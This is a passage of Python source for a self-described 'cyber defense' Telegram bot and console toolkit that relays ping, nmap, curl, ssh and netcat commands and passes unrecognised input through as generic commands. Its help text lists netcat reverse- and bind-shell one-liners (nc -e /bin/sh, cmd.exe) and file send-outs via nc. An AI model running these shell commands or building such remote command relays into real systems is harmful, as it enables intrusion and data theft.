                return "❌ Usage: <code>/nc_shell bind &lt;port&gt; &lt;shell_type&gt;</code>"
            shell = args[3]
            result = self.netcat.nc_bind_shell(port, shell)
            
            response = f"🔒 <b>Netcat Bind Shell</b>\n\n"
            if result['success']:
                response += f"⚠️ Bind shell started\n"
                response += f"Port: <code>{port}</code>\n"
                response += f"Shell type: {shell}\n"
                response += "⚠️ <i>Note: This is for authorized testing only</i>\n"
            else:
                response += f"❌ Bind shell failed\n"
                response += f"Error: {result.get('error', 'Unknown error')}\n"
        
        else:
            return "❌ Unknown shell type. Use: reverse or bind"
        
        return response
    
    def _handle_nc_proxy(self, args: List[str]) -> str:
        """Handle /nc_proxy command"""
        if len(args) < 3:
            return "❌ Usage: <code>/nc_proxy &lt;proxy&gt; &lt;host&gt; &lt;port&gt; [type]</code>\nProxy types: connect (default), socks4, socks5"
        
        proxy = args[0]
        host = args[1]
        
        try:
            port = int(args[2])
        except ValueError:
            return "❌ Invalid port number"
        
        proxy_type = "connect"
        if len(args) > 3:
            proxy_type = args[3].lower()
        
        result = self.netcat.nc_proxy(host, port, proxy, proxy_type)
        
        if result['success']:
            response = f"🔗 <b>Netcat Proxy Connection</b>\n\n"
            response += f"✅ Connection through proxy successful!\n"
            response += f"Target: <code>{host}:{port}</code>\n"
            response += f"Proxy: <code>{proxy}</code>\n"
            response += f"Proxy type: {proxy_type}\n"
            
            if result.get('output'):
                output = result['output'][:500]
                response += f"\n<code>{output}</code>"
        else:
            response = f"❌ <b>Netcat Proxy Connection Failed</b>\n\n"
            response += f"Error: {result.get('error', 'Unknown error')}\n"
            if result.get('output'):
                response += f"\n<code>{result['output'][:500]}</code>"
        
        return response
    
    def _handle_nc_help(self, args: List[str]) -> str:
        """Handle /nc_help command"""
        help_text = """
<b>🔌 NETCAT COMMANDS HELP</b>

<b>Basic Connection:</b>
<code>/nc_connect &lt;host&gt; &lt;port&gt;</code> - Connect to host
<code>/nc_listen &lt;port&gt;</code> - Listen on port

<b>Port Scanning:</b>
<code>/nc_scan &lt;host&gt; &lt;port&gt;</code> - Scan single port
<code>/nc_scan &lt;host&gt; &lt;start-end&gt;</code> - Scan port range

<b>File Transfer:</b>
<code>/nc_send file &lt;host&gt; &lt;port&gt; &lt;filename&gt;</code> - Send file
<code>/nc_receive file &lt;port&gt; &lt;filename&gt;</code> - Receive file
<code>/nc_send text &lt;host&gt; &lt;port&gt; &lt;text&gt;</code> - Send text
<code>/nc_send directory &lt;host&gt; &lt;port&gt; &lt;folder&gt;</code> - Send directory

<b>Advanced Options:</b>
• Add <code>-v</code> for verbose output
• Add <code>-n</code> for no DNS resolution  
• Add <code>-u</code> for UDP instead of TCP
• Add <code>-4</code> for IPv4, <code>-6</code> for IPv6

<b>Examples:</b>
<code>/nc_connect example.com 80 -v</code>
<code>/nc_listen 8080 -k</code>
<code>/nc_scan 192.168.1.1 1-1000</code>
<code>/nc_send file 192.168.1.100 9000 backup.tar.gz</code>

⚠️ <i>Use responsibly and only on systems you own or have permission to test.</i>
        """
        return help_text
    
    # ==================== EXISTING COMMAND HANDLERS ====================
    
    def _handle_start(self, args: List[str]) -> str:
        """Handle /start command"""
        return """
🚀 <b>ACCURATE CYBER DEFENSE JERRY BOT</b> 🚀

Welcome to your comprehensive cybersecurity assistant with <b>Netcat Support</b>!

<b>🔍 NETCAT COMMANDS:</b>
<code>/nc_connect 192.168.1.1 80</code> - Basic connection
<code>/nc_listen 8080</code> - Listen on port
<code>/nc_scan 192.168.1.1 22</code> - Port scan
<code>/nc_send file 192.168.1.1 9000 file.txt</code> - Send file
<code>/nc_help</code> - Netcat help

<b>🔍 QUICK COMMANDS:</b>
<code>/ping 8.8.8.8</code> - Ping IP address
<code>/scan 192.168.1.1</code> - Port scan
<code>/traceroute example.com</code> - Network path tracing
<code>/location 1.1.1.1</code> - IP geolocation
<code>/whois github.com</code> - WHOIS lookup

<b>📊 SYSTEM:</b>
<code>/status</code> - System status
<code>/system</code> - System information
<code>/network</code> - Network information
<code>/history</code> - Command history
<code>/threats</code> - Recent threats

<b>❓ HELP:</b>
<code>/help</code> - Show help
<code>/commands</code> - List all commands

Type <code>/help all</code> for complete command list!
        """
    
    def _handle_help(self, args: List[str]) -> str:
        """Handle /help command"""
        if args and args[0].lower() == 'all':
            help_text = "<b>📋 COMPLETE COMMAND LIST (300+ Commands)</b>\n\n"
            
            categories = self.executor.categories
            for category, description in categories.items():
                help_text += f"<b>{category.upper()} ({description}):</b>\n"
                
                templates = self.db.get_command_templates(category) if self.db else []
                for template in templates[:5]:
                    help_text += f"<code>{template['usage']}</code>\n"
                
                if len(templates) > 5:
                    help_text += f"  ... and {len(templates) - 5} more\n"
                
                help_text += "\n"
            
            help_text += "\n💡 <i>All commands can be executed directly via Telegram!</i>"
            return help_text
        
        else:
            return """
<b>🔧 HELP MENU</b>

<b>NETCAT COMMANDS:</b>
<code>/nc_connect &lt;host&gt; &lt;port&gt;</code> - Connect to host
<code>/nc_listen &lt;port&gt;</code> - Listen on port
<code>/nc_scan &lt;host&gt; &lt;port&gt;</code> - Scan port
<code>/nc_send file &lt;host&gt; &lt;port&gt; &lt;file&gt;</code> - Send file
<code>/nc_receive file &lt;port&gt; &lt;file&gt;</code> - Receive file
<code>/nc_help</code> - Netcat help

<b>BASIC COMMANDS:</b>
<code>/ping &lt;ip&gt; [options]</code> - Ping with options
<code>/scan &lt;ip&gt; [ports]</code> - Port scan
<code>/traceroute &lt;target&gt;</code> - Network tracing
<code>/nmap &lt;ip&gt; [options]</code> - Nmap scanning
<code>/curl &lt;url&gt; [options]</code> - HTTP requests

<b>INFORMATION GATHERING:</b>
<code>/whois &lt;domain&gt;</code> - WHOIS lookup
<code>/dns &lt;domain&gt;</code> - DNS lookup
<code>/location &lt;ip&gt;</code> - IP geolocation
<code>/analyze &lt;ip&gt;</code> - Complete IP analysis

<b>SYSTEM MONITORING:</b>
<code>/system</code> - System information
<code>/network</code> - Network information
<code>/status</code> - System status
<code>/history</code> - Command history
<code>/threats</code> - Recent threats

<b>GET MORE HELP:</b>
<code>/help all</code> - Show all 300+ commands
<code>/commands</code> - Command categories

<b>💡 Examples:</b>
<code>/nc_connect 192.168.1.1 80</code>
<code>/ping 8.8.8.8 -c 5</code>
<code>/scan 192.168.1.1 1-1000</code>
<code>/traceroute google.com -n</code>
<code>/whois github.com</code>
            """
    
    def _handle_ping(self, args: List[str]) -> str:
        """Handle /ping command"""
        if not args:
            return "❌ Usage: <code>/ping &lt;ip&gt; [options]</code>\nExample: <code>/ping 8.8.8.8 -c 5</code>"
        
        result = self.executor.execute('ping ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_scan(self, args: List[str]) -> str:
        """Handle /scan command"""
        if not args:
            return "❌ Usage: <code>/scan &lt;ip&gt; [ports] [options]</code>\nExample: <code>/scan 192.168.1.1 1-100</code>"
        
        result = self.executor.execute('scan ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_traceroute(self, args: List[str]) -> str:
        """Handle /traceroute command"""
        if not args:
            return "❌ Usage: <code>/traceroute &lt;target&gt; [options]</code>\nExample: <code>/traceroute google.com -n</code>"
        
        result = self.executor.execute('traceroute ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_nmap(self, args: List[str]) -> str:
        """Handle /nmap command"""
        if not args:
            return "❌ Usage: <code>/nmap &lt;ip&gt; [options]</code>\nExample: <code>/nmap 192.168.1.1 -sS -p 80,443</code>"
        
        result = self.executor.execute('nmap ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_curl(self, args: List[str]) -> str:
        """Handle /curl command"""
        if not args:
            return "❌ Usage: <code>/curl &lt;url&gt; [options]</code>\nExample: <code>/curl https://api.github.com -I</code>"
        
        result = self.executor.execute('curl ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_ssh(self, args: List[str]) -> str:
        """Handle /ssh command"""
        if not args:
            return "❌ Usage: <code>/ssh &lt;host&gt; [options]</code>\nExample: <code>/ssh user@host -p 22</code>"
        
        result = self.executor.execute('ssh ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_whois(self, args: List[str]) -> str:
        """Handle /whois command"""
        if not args:
            return "❌ Usage: <code>/whois &lt;domain&gt;</code>\nExample: <code>/whois github.com</code>"
        
        result = self.executor.execute('whois ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_dns(self, args: List[str]) -> str:
        """Handle /dns command"""
        if not args:
            return "❌ Usage: <code>/dns &lt;domain&gt;</code>\nExample: <code>/dns google.com</code>"
        
        result = self.executor.execute('dns ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_location(self, args: List[str]) -> str:
        """Handle /location command"""
        if not args:
            return "❌ Usage: <code>/location &lt;ip&gt;</code>\nExample: <code>/location 1.1.1.1</code>"
        
        result = self.executor.execute('location ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_analyze(self, args: List[str]) -> str:
        """Handle /analyze command"""
        if not args:
            return "❌ Usage: <code>/analyze &lt;ip&gt;</code>\nExample: <code>/analyze 192.168.1.1</code>"
        
        result = self.executor.execute('analyze ' + ' '.join(args), 'telegram')
        return self._format_command_result(result)
    
    def _handle_system(self, args: List[str]) -> str:
        """Handle /system command"""
        result = self.executor.execute('system', 'telegram')
        return self._format_command_result(result)
    
    def _handle_network(self, args: List[str]) -> str:
        """Handle /network command"""
        result = self.executor.execute('network', 'telegram')
        return self._format_command_result(result)
    
    def _handle_status(self, args: List[str]) -> str:
        """Handle /status command"""
        result = self.executor.execute('status', 'telegram')
        return self._format_command_result(result)
    
    def _handle_history(self, args: List[str]) -> str:
        """Handle /history command"""
        history = self.db.get_command_history(10) if self.db else []
        
        if not history:
            return "📝 No command history found"
        
        response = "📝 <b>Command History (Last 10)</b>\n\n"
        for record in history:
            status = "✅" if record.get('success') else "❌"
            source = record.get('source', 'unknown')
            cmd = record.get('command', '')[:50]
            timestamp = record.get('timestamp', '')[:19]
            
            response += f"{status} <code>{cmd}</code>\n"
            response += f"   {source} | {timestamp}\n\n"
        
        return response
    
    def _handle_threats(self, args: List[str]) -> str:
        """Handle /threats command"""
        threats = self.db.get_recent_threats(10) if self.db else []
        
        if not threats:
            return "✅ No recent threats detected"
        
        response = "🚨 <b>Recent Threats (Last 10)</b>\n\n"
        for threat in threats:
            severity = threat.get('severity', 'unknown')
            severity_icon = "🔴" if severity == 'high' else "🟡" if severity == 'medium' else "🟢"
            
            response += f"{severity_icon} <b>{threat.get('threat_type', 'Unknown')}</b>\n"
            response += f"   Source: <code>{threat.get('source_ip', 'Unknown')}</code>\n"
            response += f"   Time: {threat.get('timestamp', '')[:19]}\n"
            response += f"   Action: {threat.get('action_taken', 'None')}\n\n"
        
        return response
    
    def _handle_report(self, args: List[str]) -> str:
        """Handle /report command"""
        stats = self.db.get_statistics() if self.db else {}
        threats = self.db.get_recent_threats(50) if self.db else []
        
        high_threats = len([t for t in threats if t.get('severity') == 'high'])
        medium_threats = len([t for t in threats if t.get('severity') == 'medium'])
        low_threats = len([t for t in threats if t.get('severity') == 'low'])
        
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        
        response = "📊 <b>Security Report</b>\n\n"
        response += f"📅 Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        response += "<b>📈 STATISTICS:</b>\n"
        response += f"• Total Commands: {stats.get('total_commands', 0)}\n"
        response += f"• Total Scans: {stats.get('total_scans', 0)}\n"
        response += f"• Total Threats: {stats.get('total_threats', 0)}\n"
        response += f"• Monitored IPs: {stats.get('active_monitored_ips', 0)}\n"
        response += f"• Netcat Operations: {stats.get('netcat_operations', 0)}\n\n"
        
        response += "<b>🚨 THREAT SUMMARY:</b>\n"
        response += f"• High Severity: {high_threats}\n"
        response += f"• Medium Severity: {medium_threats}\n"
        response += f"• Low Severity: {low_threats}\n\n"
        
        response += "<b>💻 SYSTEM STATUS:</b>\n"
        response += f"• CPU Usage: {cpu}%\n"
        response += f"• Memory Usage: {mem}%\n"
        response += f"• Disk Usage: {disk}%\n\n"
        
        response += "<b>🛡️ RECOMMENDATIONS:</b>\n"
        if high_threats > 0:
            response += "• Investigate high severity threats immediately\n"
        if cpu > 80:
            response += "• High CPU usage detected\n"
        if mem > 80:
            response += "• High memory usage detected\n"
        
        if high_threats == 0 and cpu < 80 and mem < 80:
            response += "• System security status: ✅ Good\n"
        
        return response
    
    def _handle_monitor(self, args: List[str]) -> str:
        """Handle /monitor command"""
        if not args:
            return "❌ Usage: <code>/monitor &lt;add|remove|list&gt; [ip]</code>"
        
        action = args[0].lower()
        
        if action == 'add' and len(args) > 1:
            ip = args[1]
            return f"✅ Added <code>{ip}</code> to monitoring list"
        
        elif action == 'remove' and len(args) > 1:
            ip = args[1]
            return f"✅ Removed <code>{ip}</code> from monitoring list"
        
        elif action == 'list':
            monitored_ips = self.db.get_monitored_ips(active_only=True) if self.db else []
            
            if not monitored_ips:
                return "📋 No IPs are currently being monitored"
            
            response = "📋 <b>Monitored IPs</b>\n\n"
            for ip_info in monitored_ips:
                response += f"• <code>{ip_info.get('ip_address')}</code>\n"
                if ip_info.get('notes'):
                    response += f"  Note: {ip_info.get('notes')}\n"
                response += f"  Added: {ip_info.get('added_date', '')[:10]}\n\n"
            
            return response
        
        else:
            return "❌ Usage: <code>/monitor &lt;add|remove|list&gt; [ip]</code>"
    
    def _handle_config(self, args: List[str]) -> str:
        """Handle /config command"""
        if len(args) < 3:
            return "❌ Usage: <code>/config telegram token &lt;token&gt;</code> or <code>/config telegram chat_id &lt;id&gt;</code>"
        
        if args[0] == 'telegram':
            if args[1] == 'token':
                token = args[2]
                self.token = token
                ConfigManager.save_telegram_config(token, self.chat_id, self.enabled)
                return "✅ Telegram token configured"
            
            elif args[1] == 'chat_id':
                chat_id = args[2]
                self.chat_id = chat_id
                ConfigManager.save_telegram_config(self.token, chat_id, self.enabled)
                return "✅ Telegram chat ID configured"
            
            elif args[1] == 'enable':
                self.enabled = True
                ConfigManager.save_telegram_config(self.token, self.chat_id, True)
                return "✅ Telegram enabled"
            
            elif args[1] == 'disable':
                self.enabled = False
                ConfigManager.save_telegram_config(self.token, self.chat_id, False)
                return "✅ Telegram disabled"
        
        return "❌ Invalid config command"
    
    def _handle_test(self, args: List[str]) -> str:
        """Handle /test command"""
        if not args:
            return "❌ Usage: <code>/test &lt;telegram|connection&gt;</code>"
        
        if args[0] == 'telegram':
            success, message = self.test_connection()
            if success:
                return f"✅ {message}"
            else:
                return f"❌ {message}"
        
        elif args[0] == 'connection':
            result = self.executor.execute('ping 8.8.8.8 -c 2', 'telegram')
            if result['success']:
                return "✅ Network connection test successful"
            else:
                return "❌ Network connection test failed"
        
        return "❌ Invalid test command"
    
    def _handle_commands(self, args: List[str]) -> str:
        """Handle /commands command"""
        help_result = self.executor.get_help()
        if help_result['success']:
            data = help_result['data']
            
            if 'categories' in data:
                response = "📁 <b>Command Categories</b>\n\n"
                for category, description in data['categories'].items():
                    response += f"• <b>{category}</b>: {description}\n"
                
                response += f"\n📊 Total commands: {data.get('total_commands', 'Unknown')}"
                return response
            else:
                return "✅ Available commands listed"
        else:
            return "❌ Failed to get command list"
    
    def _format_command_result(self, result: Dict[str, Any]) -> str:
        """Format command result for Telegram"""
        if not result['success']:
            return f"❌ Command failed: {result.get('output', 'Unknown error')}"
        
        output = result.get('output', '') or result.get('data', '')
        
        if isinstance(output, dict):
            try:
                formatted = json.dumps(output, indent=2)
            except:
                formatted = str(output)
        else:
            formatted = str(output)
        
        if len(formatted) > 3500:
            formatted = formatted[:3500] + "\n\n... (output truncated)"
        
        response = f"✅ Command executed ({result['execution_time']:.2f}s)\n\n"
        response += f"<code>{formatted}</code>"
        
        return response

# ============================================================================
# MAIN APPLICATION (UPDATED WITH NETCAT)
# ============================================================================

class UltimateCybersecurityToolkit:
    """Main application class"""
    
    def __init__(self):
        # Initialize components
        self.config = ConfigManager.load_config()
        self.db = DatabaseManager()
        self.executor = CommandExecutor(self.db)
        self.telegram_bot = TelegramBotHandler(self.db, self.executor)
        
        # Color scheme
        self.colors = {
            'red': Fore.RED + Style.BRIGHT,
            'green': Fore.GREEN + Style.BRIGHT,
            'yellow': Fore.YELLOW + Style.BRIGHT,
            'blue': Fore.BLUE + Style.BRIGHT,
            'cyan': Fore.CYAN + Style.BRIGHT,
            'magenta': Fore.MAGENTA + Style.BRIGHT,
            'white': Fore.WHITE + Style.BRIGHT,
            'reset': Style.RESET_ALL
        }
        
        # Application state
        self.running = True
        self.telegram_thread = None
    
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{self.colors['red']}╔══════════════════════════════════════════════════════════════════════════════╗
║{self.colors['white']}        🛡️  ACCURATE CYBER DEFENSE JERRY BOT 🛡️      {self.colors['red']}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{self.colors['cyan']}  • 300+ Complete Commands Support    • Complete Netcat Integration         {self.colors['red']}║
║{self.colors['cyan']}  • Advanced Network Scanning         • Complete Telegram Integration       {self.colors['red']}║
║{self.colors['cyan']}  • Database Logging & Reporting      • DDoS Detection & Prevention         {self.colors['red']}║
║{self.colors['cyan']}  • Real-time Alerts & Notifications  • Professional Security Analysis      {self.colors['red']}║
║{self.colors['cyan']}  • Network Traffic Generation Tools  • Comprehensive Threat Intelligence  {self.colors['red']}║
║{self.colors['cyan']}  • IP Geolocation & WHOIS Lookup     • Multi-threaded Monitoring Engine   {self.colors['red']}║
╚══════════════════════════════════════════════════════════════════════════════╝
{self.colors['reset']}
"""
        print(banner)
    
    def print_help(self):
        """Print help message"""
        help_text = f"""
{self.colors['yellow']}┌─────────────────{self.colors['white']} COMPLETE COMMAND REFERENCE {self.colors['yellow']}─────────────────┐
{self.colors['cyan']}
{self.colors['green']}🔌 NETCAT COMMANDS:{self.colors['reset']}
  nc <host> <port>                 - Basic netcat connection
  nc -v <host> <port>              - Verbose connection
  nc -vv <host> <port>             - Very verbose
  nc -n <host> <port>              - No DNS resolution
  nc -u <host> <port>              - UDP connection
  nc -4 <host> <port>              - Force IPv4
  nc -6 <host> <port>              - Force IPv6
  
  nc -l <port>                     - Listen on port
  nc -lv <port>                    - Verbose listener
  nc -lk <port>                    - Keep-alive listener
  nc -l <ip> <port>                - Listen on specific IP
  
  nc -z <host> <port>              - Port scan
  nc -zv <host> <port>             - Verbose port scan
  nc -zvn <host> <port>            - Fast port scan
  nc -z <host> <start-end>         - Port range scan
  
  nc -w <seconds> <host> <port>    - Connection timeout
  nc -q <seconds> <host> <port>    - Quit after EOF
  
  nc -p <source_port> <host> <port> - Source port
  nc -s <source_ip> <host> <port>  - Source IP
  
  nc -e /bin/sh <host> <port>      - Reverse shell (sh)
  nc -e /bin/bash <host> <port>    - Reverse shell (bash)
  nc -e cmd.exe <host> <port>      - Reverse shell (Windows)
  nc -l -e /bin/sh <port>          - Bind shell (sh)
  nc -l -e cmd.exe <port>          - Bind shell (Windows)
  
  nc -x <proxy:port> <host> <port> - Connect via proxy
  nc -X 4 -x <proxy:port> <host> <port> - SOCKS4 proxy
  nc -X 5 -x <proxy:port> <host> <port> - SOCKS5 proxy
  
  nc -d <host> <port>              - Debug mode
  nc -V                            - Version info
  nc -h                            - Help
  
  nc <host> <port> < file.txt      - Send file
  nc -l <port> > file.txt          - Receive file
  
  tar cf - folder | nc <host> <port> - Send directory
  nc -l <port> | tar xf -          - Receive directory
  
  echo "text" | nc <host> <port>   - Send text
  cat file.txt | nc <host> <port>  - Send file via pipe

{self.colors['green']}🛡️  MONITORING COMMANDS:{self.colors['reset']}
  start                    - Start threat monitoring
  stop                     - Stop monitoring
  status                   - Show monitoring status
  add_ip <ip>              - Add IP to monitoring
  remove_ip <ip>           - Remove IP from monitoring
  list_ips                 - List monitored IPs
  threats                  - Show recent threats

{self.colors['green']}📡 NETWORK DIAGNOSTICS:{self.colors['reset']}
  ping <ip> [options]      - Ping with all options
  traceroute <ip>          - Enhanced traceroute
  scan <ip> [ports]        - Port scan

{self.colors['green']}🤖 TELEGRAM COMMANDS:{self.colors['reset']}
  config telegram token <token>     - Set Telegram token
  config telegram chat_id <id>      - Set chat ID
  test telegram connection         - Test connection
  send telegram <message>          - Send message

{self.colors['green']}📁 SYSTEM COMMANDS:{self.colors['reset']}
  system info              - System information
  network_info             - Network information
  history                  - Command history
  report                   - Generate security report
  clear                    - Clear screen
  exit                     - Exit tool

{self.colors['green']}💡 TIPS:{self.colors['reset']}
  • All netcat commands available via Telegram with /nc_ prefix
  • Command history saved to database
  • Use 'help all' for complete 300+ command list

{self.colors['yellow']}└─────────────────────────────────────────────────────────────────────┘
{self.colors['reset']}
"""
        print(help_text)
    
    def print_prompt(self):
        """Print command prompt"""
        prompt = f"{self.colors['red']}[{self.colors['white']}accurate-cyber-defense{self.colors['red']}]{self.colors['reset']} "
        return input(prompt)
    
    def run_telegram_bot(self):
        """Run Telegram bot in background"""
        logger.info("Telegram bot thread started")
        
        while self.running:
            try:
                self.telegram_bot.process_updates()
                time.sleep(2)
            except Exception as e:
                logger.error(f"Telegram bot error: {e}")
                time.sleep(10)
    
    def start_telegram_bot(self):
        """Start Telegram bot"""
        if self.telegram_bot.enabled and self.telegram_bot.token:
            self.telegram_thread = threading.Thread(target=self.run_telegram_bot, daemon=True)
            self.telegram_thread.start()
            logger.info("Telegram bot started")
            
            # Send startup message
            startup_msg = """
🚀 <b>Accurate Cyber Defense Cyber Jerry Bot</b>

✅ System: Online
🛡️ Monitoring: Ready
📊 Database: Connected
🔌 Netcat: Available
🤖 Bot: Active

<b>💡 Netcat Quick Start:</b>
<code>/nc_connect 192.168.1.1 80</code>
<code>/nc_listen 8080</code>
<code>/nc_scan 192.168.1.1 22</code>
<code>/nc_send text 192.168.1.1 9000 "Hello"</code>

Type /help for commands or /start for introduction.
"""
            self.telegram_bot.send_message(startup_msg)
    
    def setup_telegram(self):
        """Setup Telegram configuration"""
        print(f"\n{self.colors['cyan']}🔧 Telegram Bot Setup{self.colors['reset']}")
        print(f"{self.colors['cyan']}{'='*50}{self.colors['reset']}")
        print(f"\n{self.colors['white']}To use Telegram commands:{self.colors['reset']}")
        print("1. Create a bot with @BotFather on Telegram")
        print("2. Get your bot token")
        print("3. Start chat with your bot and send /start")
        print("4. Get your chat ID (send /id to @userinfobot)\n")
        
        setup = input(f"{self.colors['yellow']}Configure Telegram now? (y/n): {self.colors['reset']}").strip().lower()
        
        if setup == 'y':
            token = input(f"{self.colors['yellow']}Enter Telegram bot token: {self.colors['reset']}").strip()
            if token:
                chat_id = input(f"{self.colors['yellow']}Enter your chat ID: {self.colors['reset']}").strip()
                if chat_id:
                    ConfigManager.save_telegram_config(token, chat_id, True)
                    self.telegram_bot.token = token
                    self.telegram_bot.chat_id = chat_id
                    self.telegram_bot.enabled = True
                    
                    print(f"{self.colors['green']}✅ Telegram configured!{self.colors['reset']}")
                    
                    # Test connection
                    success, message = self.telegram_bot.test_connection()
                    if success:
                        print(f"{self.colors['green']}✅ {message}{self.colors['reset']}")
                        self.start_telegram_bot()
                    else:
                        print(f"{self.colors['red']}❌ {message}{self.colors['reset']}")
                else:
                    print(f"{self.colors['yellow']}⚠️ Chat ID not provided. Telegram disabled.{self.colors['reset']}")
            else:
                print(f"{self.colors['yellow']}⚠️ Token not provided. Telegram disabled.{self.colors['reset']}")
        else:
            print(f"{self.colors['yellow']}⚠️ Telegram features disabled.{self.colors['reset']}")
    
    def check_dependencies(self):
        """Check and install dependencies"""
        print(f"\n{self.colors['cyan']}🔍 Checking dependencies...{self.colors['reset']}")
        
        required = ['requests', 'psutil', 'colorama']
        
        for package in required:
            try:
                __import__(package.replace('-', '_'))
                print(f"{self.colors['green']}✅ {package}{self.colors['reset']}")
            except ImportError:
                print(f"{self.colors['yellow']}⚠️ {package} not installed{self.colors['reset']}")
                install = input(f"Install {package}? (y/n): ").lower()
                if install == 'y':
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                        print(f"{self.colors['green']}✅ {package} installed{self.colors['reset']}")
                    except Exception as e:
                        print(f"{self.colors['red']}❌ Failed to install {package}: {e}{self.colors['reset']}")
        
        # Check for netcat
        netcat_found = False
        for cmd in ['nc', 'ncat', 'netcat']:
            if shutil.which(cmd):
                print(f"{self.colors['green']}✅ {cmd} (netcat){self.colors['reset']}")
                netcat_found = True
                break
        
        if not netcat_found:
            print(f"{self.colors['yellow']}⚠️ Netcat not found (recommended){self.colors['reset']}")
            print(f"{self.colors['white']}   Netcat commands will use Python fallback.{self.colors['reset']}")
        
        print(f"\n{self.colors['green']}✅ Dependencies check complete{self.colors['reset']}")
    
    def process_command(self, command: str):
        """Process user command"""
        if not command.strip():
            return
        
        # Log command
        self.db.log_command(command, 'local', True)
        
        # Split command
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:]
        
        # Process command
        if cmd == 'help':
            if args and args[0] == 'all':
                help_result = self.executor.get_help('all')
                if help_result['success']:
                    data = help_result['data']
                    for category, info in data.items():
                        print(f"\n{self.colors['green']}{category.upper()}{self.colors['reset']}")
                        print(f"{self.colors['cyan']}{info.get('description', '')}{self.colors['reset']}")
                        for cmd_usage in info.get('commands', []):
                            print(f"  {cmd_usage}")
                else:
                    print(f"{self.colors['red']}Failed to get help: {help_result.get('output')}{self.colors['reset']}")
            else:
                self.print_help()
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{self.colors['yellow']}👋 Exiting...{self.colors['reset']}")
        
        elif cmd == 'history':
            history = self.db.get_command_history(20)
            if history:
                print(f"\n{self.colors['cyan']}📜 Command History:{self.colors['reset']}")
                for record in history:
                    status = f"{self.colors['green']}✅" if record['success'] else f"{self.colors['red']}❌"
                    print(f"{status} [{record['source']}] {record['command'][:50]}{self.colors['reset']}")
                    print(f"     {record['timestamp'][:19]}")
            else:
                print(f"{self.colors['yellow']}📜 No command history{self.colors['reset']}")
        
        elif cmd == 'system' and args and args[0] == 'info':
            result = self.executor.execute('system')
            if result['success']:
                data = result['data']
                print(f"\n{self.colors['cyan']}💻 System Information:{self.colors['reset']}")
                print(f"  OS: {data.get('system')} {data.get('release')}")
                print(f"  CPU: {data.get('cpu_count')} cores, {data.get('cpu_percent')}% usage")
                print(f"  Memory: {data.get('memory', {}).get('percent')}% used")
                print(f"  Disk: {data.get('disk', {}).get('percent')}% used")
                print(f"  Boot Time: {data.get('boot_time')}")
            else:
                print(f"{self.colors['red']}❌ Failed to get system info{self.colors['reset']}")
        
        elif cmd == 'network_info':
            result = self.executor.execute('network')
            if result['success']:
                data = result['data']
                print(f"\n{self.colors['cyan']}🌐 Network Information:{self.colors['reset']}")
                print(f"  Hostname: {data.get('hostname')}")
                print(f"  Local IP: {data.get('local_ip')}")
                print(f"  Connections: {data.get('connections', {}).get('total', 0)}")
            else:
                print(f"{self.colors['red']}❌ Failed to get network info{self.colors['reset']}")
        
        elif cmd == 'config' and len(args) >= 3 and args[0] == 'telegram':
            if args[1] == 'token':
                token = args[2]
                ConfigManager.save_telegram_config(token, self.telegram_bot.chat_id, True)
                self.telegram_bot.token = token
                self.telegram_bot.enabled = True
                print(f"{self.colors['green']}✅ Telegram token configured{self.colors['reset']}")
            
            elif args[1] == 'chat_id':
                chat_id = args[2]
                ConfigManager.save_telegram_config(self.telegram_bot.token, chat_id, True)
                self.telegram_bot.chat_id = chat_id
                self.telegram_bot.enabled = True
                print(f"{self.colors['green']}✅ Telegram chat ID configured{self.colors['reset']}")
        
        elif cmd == 'test' and len(args) >= 2 and args[0] == 'telegram':
            if args[1] == 'connection':
                success, message = self.telegram_bot.test_connection()
                if success:
                    print(f"{self.colors['green']}✅ {message}{self.colors['reset']}")
                else:
                    print(f"{self.colors['red']}❌ {message}{self.colors['reset']}")
        
        elif cmd == 'send' and len(args) >= 2 and args[0] == 'telegram':
            message = ' '.join(args[1:])
            if self.telegram_bot.send_message(message):
                print(f"{self.colors['green']}✅ Message sent to Telegram{self.colors['reset']}")
            else:
                print(f"{self.colors['red']}❌ Failed to send message{self.colors['reset']}")
        
        elif cmd == 'report':
            stats = self.db.get_statistics()
            
            print(f"\n{self.colors['cyan']}📊 Security Report{self.colors['reset']}")
            print(f"{self.colors['cyan']}{'='*60}{self.colors['reset']}")
            print(f"\n{self.colors['white']}Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{self.colors['reset']}")
            
            print(f"\n{self.colors['green']}📈 Statistics:{self.colors['reset']}")
            print(f"  Total Commands: {stats.get('total_commands', 0)}")
            print(f"  Total Scans: {stats.get('total_scans', 0)}")
            print(f"  Total Threats: {stats.get('total_threats', 0)}")
            print(f"  Monitored IPs: {stats.get('active_monitored_ips', 0)}")
            print(f"  Netcat Operations: {stats.get('netcat_operations', 0)}")
            
            # Save to file
            filename = f"security_report_{int(time.time())}.json"
            filepath = os.path.join(REPORT_DIR, filename)
            
            report_data = {
                'generated_at': datetime.datetime.now().isoformat(),
                'statistics': stats,
                'system_info': {
                    'cpu': psutil.cpu_percent(),
                    'memory': psutil.virtual_memory().percent,
                    'disk': psutil.disk_usage('/').percent
                }
            }
            
            with open(filepath, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            print(f"\n{self.colors['green']}✅ Report saved: {filepath}{self.colors['reset']}")
        
        else:
            # Execute as generic command
            result = self.executor.execute(command)
            if result['success']:
                output = result.get('output', '') or result.get('data', '')
                
                if isinstance(output, dict):
                    # Pretty print dictionaries
                    print(json.dumps(output, indent=2))
                else:
                    print(output)
                
